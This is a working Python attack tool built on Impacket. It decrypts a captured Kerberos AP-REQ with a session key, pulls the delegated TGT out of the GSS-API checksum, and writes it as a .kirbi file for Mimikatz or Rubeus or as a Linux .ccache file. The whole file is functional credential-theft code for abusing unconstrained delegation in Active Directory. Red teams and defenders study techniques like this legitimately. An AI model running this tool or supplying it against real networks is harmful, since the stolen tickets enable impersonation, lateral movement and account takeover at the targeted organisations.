#!/usr/bin/env python3
"""
Extract delegated TGT from AP-REQ using session key
Supports output to .kirbi (Windows) or .ccache (Linux)
"""

import argparse
import struct
import binascii
import sys
import os

from pyasn1.codec.der import decoder, encoder

# Impacket imports
from impacket.krb5.asn1 import (
    AP_REQ, Authenticator, KRB_CRED, EncKrbCredPart
)
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.ccache import CCache


def hex_to_bytes(hex_str):
    """Convert hex string to bytes"""
    cleaned = hex_str.replace(' ', '').replace('\n', '').replace('\r', '').replace('0x', '')
    return binascii.unhexlify(cleaned)


def find_ap_req(data):
    """Find AP-REQ (tag 0x6e) in data, handling GSS-API wrapper"""
    
    if data[0] == 0x6e:
        return data
    
    if data[0] == 0x60:
        for pattern in [b'\x6e\x82', b'\x6e\x81', b'\x6e']:
            idx = data.find(pattern)
            if idx != -1:
                print(f"[*] Found AP-REQ at offset {idx}")
                return data[idx:]
    
    idx = data.find(b'\x6e')
    if idx != -1:
        return data[idx:]
    
    return None


def parse_gss_checksum(cksum_data):
    """Parse GSS-API checksum (RFC 4121) to extract KRB-CRED"""
    
    if len(cksum_data) < 24:
        print(f"[-] Checksum too short: {len(cksum_data)} bytes")
        return None
    
    pos = 0
    
    cb_len = struct.unpack('<I', cksum_data[pos:pos+4])[0]
    pos += 4 + cb_len
    
    print(f"[*] Channel binding length: {cb_len}")
    
    flags = struct.unpack('<I', cksum_data[pos:pos+4])[0]
    pos += 4
    
    print(f"[*] GSS Flags: 0x{flags:08x}")
    print(f"    - Deleg:    {bool(flags & 0x01)}")
    print(f"    - Mutual:   {bool(flags & 0x02)}")
    print(f"    - Replay:   {bool(flags & 0x04)}")
    print(f"    - Sequence: {bool(flags & 0x08)}")
    
    if not (flags & 1):
        print("[-] Delegation flag NOT set - no delegated ticket!")
        return None
    
    dlg_opt = struct.unpack('<H', cksum_data[pos:pos+2])[0]
    pos += 2
    
    deleg_len = struct.unpack('<H', cksum_data[pos:pos+2])[0]
    pos += 2
    
    print(f"[*] Delegation option: 0x{dlg_opt:04x}")
    print(f"[*] Delegated cred length: {deleg_len}")
    
    if pos + deleg_len > len(cksum_data):
        print(f"[-] Truncated: need {pos + deleg_len}, have {len(cksum_data)}")
        return None
    
    return cksum_data[pos:pos+deleg_len]


def decrypt_krb_cred_if_needed(krb_cred_data, key_bytes, etype):
    """Decrypt KRB-CRED enc-part if etype != 0"""
    
    try:
        krb_cred, _ = decoder.decode(krb_cred_data, asn1Spec=KRB_CRED())
    except Exception as e:
        print(f"[-] Failed to parse KRB-CRED: {e}")
        return krb_cred_data
    
    enc_etype = int(krb_cred['enc-part']['etype'])
    
    if enc_etype == 0:
        print("[*] KRB-CRED not encrypted (etype=0)")
        return krb_cred_data
    
    print(f"[*] KRB-CRED encrypted with etype {enc_etype}, decrypting...")
    
    try:
        cipher = _enctype_table[enc_etype]
        key = Key(enc_etype, key_bytes)
        ciphertext = bytes(krb_cred['enc-part']['cipher'])
        
        plaintext = cipher.decrypt(key, 14, ciphertext)
        
        krb_cred['enc-part']['etype'] = 0
        krb_cred['enc-part']['cipher'] = plaintext
        
        return encoder.encode(krb_cred)
        
    except Exception as e:
        print(f"[!] Decryption failed: {e}, returning as-is")
        return krb_cred_data


# ============================================================
# CCACHE CONVERSION FUNCTIONS (FIXED)
# ============================================================

def kirbi_to_ccache(kirbi_data):
    """
    Convert KRB-CRED (.kirbi) data to CCache object
    
    Args:
        kirbi_data: Raw bytes of KRB-CRED structure
        
    Returns:
        CCache object or None on failure
    """
    try:
        # FIX: Create instance first, then call fromKRBCRED
        ccache = CCache()
        ccache.fromKRBCRED(kirbi_data)
        return ccache
    except Exception as e:
        print(f"[-] Failed to convert to ccache: {e}")
        # Try alternative method
        return kirbi_to_ccache_manual(kirbi_data)


def kirbi_to_ccache_manual(kirbi_data):
    """
    Manual conversion of KRB-CRED to CCache
    Fallback if impacket's method fails
    """
    try:
        from impacket.krb5.ccache import CCache, Header, Principal, Credential
        from impacket.krb5.ccache import KeyBlock, Times, CountedOctetString
        from impacket.krb5 import types
        
        # Parse KRB-CRED
        krb_cred, _ = decoder.decode(kirbi_data, asn1Spec=KRB_CRED())
        
        # Get enc-part
        enc_etype = int(krb_cred['enc-part']['etype'])
        enc_data = bytes(krb_cred['enc-part']['cipher'])
        
        if enc_etype != 0:
            print("[-] Manual conversion requires unencrypted KRB-CRED (etype=0)")
            return None
        
        # Parse EncKrbCredPart
        enc_cred_part, _ = decoder.decode(enc_data, asn1Spec=EncKrbCredPart())
        ticket_info = enc_cred_part['ticket-info'][0]
        ticket = krb_cred['tickets'][0]
        
        # Build CCache
        ccache = CCache()
        
        # Set principal
        cname_parts = [str(x) for x in ticket_info['pname']['name-string']]
        crealm = str(ticket_info['prealm'])
        
        ccache_principal = Principal()
        ccache_principal['name-type'] = int(ticket_info['pname']['name-type'])
        ccache_principal['realm'] = CountedOctetString()
        ccache_principal['realm']['data'] = crealm.encode()
        ccache_principal['realm']['length'] = len(crealm)
        ccache_principal['components'] = len(cname_parts)
        ccache_principal['component'] = []
        
        for part in cname_parts:
            component = CountedOctetString()
            component['data'] = part.encode()
            component['length'] = len(part)
            ccache_principal['component'].append(component)
        
        ccache['principal'] = ccache_principal
        
        # Build credential
        credential = Credential()
        
        # Client principal
        credential['client'] = ccache_principal
        
        # Server principal
        sname_parts = [str(x) for x in ticket_info['sname']['name-string']]
        srealm = str(ticket_info['srealm']) if ticket_info['srealm'] else crealm
        
        server_principal = Principal()
        server_principal['name-type'] = int(ticket_info['sname']['name-type'])
        server_principal['realm'] = CountedOctetString()
        server_principal['realm']['data'] = srealm.encode()
        server_principal['realm']['length'] = len(srealm)
        server_principal['components'] = len(sname_parts)
        server_principal['component'] = []
        
        for part in sname_parts:
            component = CountedOctetString()
            component['data'] = part.encode()
            component['length'] = len(part)
            server_principal['component'].append(component)
        
        credential['server'] = server_principal
        
        # Key
        key_data = bytes(ticket_info['key']['keyvalue'])
        key_type = int(ticket_info['key']['keytype'])
        
        keyblock = KeyBlock()
        keyblock['keytype'] = key_type
        keyblock['keyvalue'] = CountedOctetString()
        keyblock['keyvalue']['data'] = key_data
        keyblock['keyvalue']['length'] = len(key_data)
        credential['key'] = keyblock
        
        # Times
        times = Times()
        
        def parse_krb_time(t):
            if t is None:
                return 0
            import datetime
            try:
                s = str(t)
                # Format: YYYYMMDDHHMMSSZ
                dt = datetime.datetime.strptime(s, '%Y%m%d%H%M%SZ')
                return int(dt.timestamp())
            except:
                return 0
        
        times['authtime'] = parse_krb_time(ticket_info['authtime'])
        times['starttime'] = parse_krb_time(ticket_info['starttime'])
        times['endtime'] = parse_krb_time(ticket_info['endtime'])
        times['renew_till'] = parse_krb_time(ticket_info['renew-till'])
        credential['time'] = times
        
        # Ticket
        ticket_data = encoder.encode(ticket)
        credential['ticket'] = CountedOctetString()
        credential['ticket']['data'] = ticket_data
        credential['ticket']['length'] = len(ticket_data)
        
        # Flags
        if ticket_info['flags']:
            flags_bytes = bytes(ticket_info['flags'])
            if len(flags_bytes) >= 4:
                credential['tktflags'] = struct.unpack('>I', flags_bytes[:4])[0]
            else:
                credential['tktflags'] = 0
        else:
            credential['tktflags'] = 0
        
        # Empty fields
        credential['is_skey'] = 0
        credential['second_ticket'] = CountedOctetString()
        credential['second_ticket']['data'] = b''
        credential['second_ticket']['length'] = 0
        credential['num-address'] = 0
        credential['num-authdata'] = 0
        
        ccache['credentials'] = [credential]
        ccache['header'] = Header()
        ccache['header']['tag'] = 0
        ccache['header']['taglen'] = 0
        ccache['header']['tagdata'] = b''
        
        print("[+] Manual ccache conversion successful")
        return ccache
        
    except Exception as e:
        print(f"[-] Manual conversion failed: {e}")
        import traceback
        traceback.print_exc()
        return None


def save_as_ccache(kirbi_data, output_file):
    """
    Save KRB-CRED data as ccache file
    """
    ccache = kirbi_to_ccache(kirbi_data)
    if ccache is None:
        return False
    
    try:
        ccache.saveFile(output_file)
        print(f"[+] Saved ccache to {output_file}")
        return True
    except Exception as e:
        print(f"[-] Failed to save ccache: {e}")
        return False


def save_as_kirbi(kirbi_data, output_file):
    """Save KRB-CRED data as kirbi file"""
    try:
        with open(output_file, 'wb') as f:
            f.write(kirbi_data)
        print(f"[+] Saved kirbi to {output_file}")
        return True
    except Exception as e:
        print(f"[-] Failed to save kirbi: {e}")
        return False


def save_ticket(kirbi_data, output_file, output_format=None):
    """Save ticket in specified format"""
    
    if output_format is None:
        ext = os.path.splitext(output_file)[1].lower()
        if ext in ['.ccache', '.cc']:
            output_format = 'ccache'
        else:
            output_format = 'kirbi'
    
    print(f"[*] Output format: {output_format}")
    
    if output_format == 'ccache':
        return save_as_ccache(kirbi_data, output_file)
    else:
        return save_as_kirbi(kirbi_data, output_file)


def print_ticket_info(kirbi_data):
    """Print information about the ticket"""
    try:
        krb_cred, _ = decoder.decode(kirbi_data, asn1Spec=KRB_CRED())
        
        ticket = krb_cred['tickets'][0]
        realm = str(ticket['realm'])
        sname_parts = [str(x) for x in ticket['sname']['name-string']]
        sname = '/'.join(sname_parts)
        etype = int(ticket['enc-part']['etype'])
        
        print(f"[+] Ticket Information:")
        print(f"    Service:  {sname}@{realm}")
        print(f"    Etype:    {etype}")
        
        enc_part_data = bytes(krb_cred['enc-part']['cipher'])
        enc_etype = int(krb_cred['enc-part']['etype'])
        
        if enc_etype == 0:
            try:
                cred_info, _ = decoder.decode(enc_part_data, asn1Spec=EncKrbCredPart())
                ticket_info = cred_info['ticket-info'][0]
                
                if ticket_info['pname']:
                    cname_parts = [str(x) for x in ticket_info['pname']['name-string']]
                    cname = '/'.join(cname_parts)
                    crealm = str(ticket_info['prealm']) if ticket_info['prealm'] else realm
                    print(f"    Client:   {cname}@{crealm}")
                
                if ticket_info['starttime']:
                    print(f"    Start:    {ticket_info['starttime']}")
                if ticket_info['endtime']:
                    print(f"    End:      {ticket_info['endtime']}")
                if ticket_info['renew-till']:
                    print(f"    Renew:    {ticket_info['renew-till']}")
                    
                if ticket_info['key']:
                    key_etype = int(ticket_info['key']['keytype'])
                    key_data = bytes(ticket_info['key']['keyvalue'])
                    print(f"    Key Type: {key_etype}")
                    print(f"    Key:      {key_data.hex()}")
                    
            except Exception as e:
                print(f"    (Could not parse enc-part: {e})")
                
    except Exception as e:
        print(f"[!] Could not parse ticket info: {e}")


def extract_tgt_from_apreq(req_bytes, key_bytes, keytype):
    """Extract delegated TGT from AP-REQ"""
    
    ap_req_bytes = find_ap_req(req_bytes)
    if not ap_req_bytes:
        print("[-] Could not find AP-REQ")
        return None
    
    try:
        ap_req, _ = decoder.decode(ap_req_bytes, asn1Spec=AP_REQ())
        print("[+] AP-REQ parsed")
    except Exception as e:
        print(f"[-] Parse failed: {e}")
        return None
    
    enc_auth = ap_req['authenticator']
    auth_etype = int(enc_auth['etype'])
    auth_cipher = bytes(enc_auth['cipher'])
    
    print(f"[*] Authenticator etype: {auth_etype}")
    
    if auth_etype != keytype:
        print(f"[!] Adjusting keytype to match authenticator: {auth_etype}")
        keytype = auth_etype
    
    try:
        cipher = _enctype_table[keytype]
        key = Key(keytype, key_bytes)
        
        try:
            plain_auth = cipher.decrypt(key, 11, auth_cipher)
        except:
            print("[*] Trying key usage 7...")
            plain_auth = cipher.decrypt(key, 7, auth_cipher)
            
        print("[+] Authenticator decrypted")
        
    except Exception as e:
        print(f"[-] Decryption failed: {e}")
        return None
    
    try:
        authenticator, _ = decoder.decode(plain_auth, asn1Spec=Authenticator())
        print("[+] Authenticator parsed")
        
        crealm = str(authenticator['crealm'])
        cname = '/'.join(str(x) for x in authenticator['cname']['name-string'])
        print(f"[*] Client: {cname}@{crealm}")
        
    except Exception as e:
        print(f"[-] Parse failed: {e}")
        return None
    
    cksum = authenticator['cksum']
    if cksum is None:
        print("[-] No checksum - no delegation")
        return None
    
    try:
        cksum_type = int(cksum['cksumtype'])
        cksum_data = bytes(cksum['checksum'])
    except:
        print("[-] Could not read checksum")
        return None
    
    print(f"[*] Checksum type: 0x{cksum_type:04x}, {len(cksum_data)} bytes")
    
    if cksum_type != 0x8003:
        print(f"[-] Not GSS-API checksum (expected 0x8003)")
        return None
    
    krb_cred_data = parse_gss_checksum(cksum_data)
    if not krb_cred_data:
        return None
    
    print(f"[+] Extracted {len(krb_cred_data)} bytes of KRB-CRED")
    
    final_data = decrypt_krb_cred_if_needed(krb_cred_data, key_bytes, keytype)
    
    return final_data


def main():
    parser = argparse.ArgumentParser(
        description='Extract delegated TGT from AP-REQ',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Key Types:
  17 = AES128-CTS-HMAC-SHA1
  18 = AES256-CTS-HMAC-SHA1  
  23 = RC4-HMAC

Output Formats (auto-detected from extension):
  .kirbi  - Windows format (Mimikatz/Rubeus)
  .ccache - Linux format (MIT Kerberos)
'''
    )
    
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-req', help='AP-REQ hex string')
    group.add_argument('-reqfile', help='File containing AP-REQ hex')
    
    parser.add_argument('-key', required=True, help='Session key hex')
    parser.add_argument('-keytype', type=int, default=23, help='Key etype (default: 23)')
    parser.add_argument('-out', required=True, help='Output file')
    parser.add_argument('-format', choices=['kirbi', 'ccache'],
                        help='Force output format')
    
    args = parser.parse_args()
    
    if args.reqfile:
        with open(args.reqfile, 'r') as f:
            req_hex = f.read()
    else:
        req_hex = args.req
    
    req_bytes = hex_to_bytes(req_hex)
    key_bytes = hex_to_bytes(args.key)
    
    print(f"[*] AP-REQ: {len(req_bytes)} bytes")
    print(f"[*] Session key: {len(key_bytes)} bytes, etype {args.keytype}")
    print()
    
    kirbi_data = extract_tgt_from_apreq(req_bytes, key_bytes, args.keytype)
    if kirbi_data is None:
        return 1
    
    print()
    print_ticket_info(kirbi_data)
    print()
    
    if not save_ticket(kirbi_data, args.out, args.format):
        return 1
    
    return 0


if __name__ == '__main__':
    sys.exit(main())